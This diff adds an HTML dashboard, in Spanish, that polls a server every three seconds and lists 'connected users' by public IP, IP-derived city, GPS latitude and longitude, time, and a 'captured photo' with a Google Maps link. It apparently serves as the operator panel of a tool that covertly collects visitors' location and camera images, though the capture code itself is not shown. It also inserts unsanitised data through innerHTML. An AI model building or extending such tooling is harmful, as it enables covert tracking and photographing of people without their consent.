@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Panel de Control</title>
+  <link rel="stylesheet" href="estilos.css">
+</head>
+<body>
+  <div class="container">
+    <h1>📡 Panel de Usuarios Conectados</h1>
+
+    <input type="text" id="searchInput" placeholder="Buscar por IP..." />
+
+    <table id="userTable">
+      <thead>
+        <tr>
+          <th>IP Pública</th>
+          <th>Latitud</th>
+          <th>Longitud</th>
+          <th>Fecha y hora</th>
+          <th>Foto capturada</th>
+        </tr>
+      </thead>
+      <tbody id="tableBody">
+        <!-- Contenido dinámico -->
+      </tbody>
+    </table>
+  </div>
+
+<script>
+  async function loadUsers() {
+    const res = await fetch('/api/report');
+    const users = await res.json();
+    const tableBody = document.getElementById('tableBody');
+    const filter = document.getElementById('searchInput').value.trim();
+
+    tableBody.innerHTML = '';
+
+    for (const user of users.filter(u => u.ip.includes(filter))) {
+      const row = document.createElement('tr');
+
+      // Obtener info IP
+      let ipInfo = { city: '-', regionName: '-', country: '-' };
+      try {
+        const infoRes = await fetch(`http://ip-api.com/json/${user.ip}`);
+        ipInfo = await infoRes.json();
+      } catch (err) {
+        console.warn("Error obteniendo info IP", user.ip);
+      }
+
+      // Procesar ubicación
+      const hasLocation = user.lat !== null && user.lng !== null;
+      const lat = hasLocation ? user.lat.toFixed(5) : `<span style="color: #f39c12;">⚠️ Sin ubicación</span>`;
+      const lng = hasLocation ? user.lng.toFixed(5) : `<span style="color: #f39c12;">⚠️</span>`;
+      const googleMapsLink = hasLocation
+        ? `<a href="https://www.google.com/maps?q=${user.lat},${user.lng}" target="_blank" style="color:#83f1e8;">Ver en Google Maps</a>`
+        : `<span style="color: #777;">No disponible</span>`;
+
+      // Procesar imagen
+      const photoCell = user.photo
+        ? `<img src="${user.photo}" width="100">`
+        : `<div style="width:100px;height:75px;background:#555;color:#ccc;display:flex;align-items:center;justify-content:center;border-radius:8px;">Sin foto</div>`;
+
+      row.innerHTML = `
+        <td>
+          <strong>${user.ip}</strong><br>
+          <small>${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}</small>
+        </td>
+        <td>${lat}</td>
+        <td>${lng}</td>
+        <td>${new Date(user.timestamp * 1000).toLocaleString()}</td>
+        <td>
+          ${photoCell}<br>
+          ${googleMapsLink}
+        </td>
+      `;
+
+      tableBody.appendChild(row);
+    }
+  }
+
+  setInterval(loadUsers, 3000);
+  document.getElementById('searchInput').addEventListener('input', loadUsers);
+  loadUsers();
+</script>
+</body>
+</html>
